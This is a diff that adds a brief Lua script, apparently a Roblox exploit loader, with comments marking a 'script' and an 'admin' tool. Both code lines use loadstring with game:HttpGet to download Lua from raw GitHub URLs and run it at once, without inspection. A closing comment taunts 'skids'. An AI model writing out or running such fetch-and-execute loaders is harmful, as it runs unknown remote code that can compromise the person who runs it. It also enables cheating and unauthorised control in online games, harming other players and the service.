@@ -1,0 +1,5 @@
+-- script 
+loadstring(game:HttpGet("https://raw.githubusercontent.com/bruton-lua-sources/Olk/refs/heads/main/Roooooom.lua"))()
+-- admin
+loadstring(game:HttpGet("https://raw.githubusercontent.com/sukunalua/chat-server/refs/heads/main/V0.2.lua"))()
+-- no skid bro is not god 😂😂😂
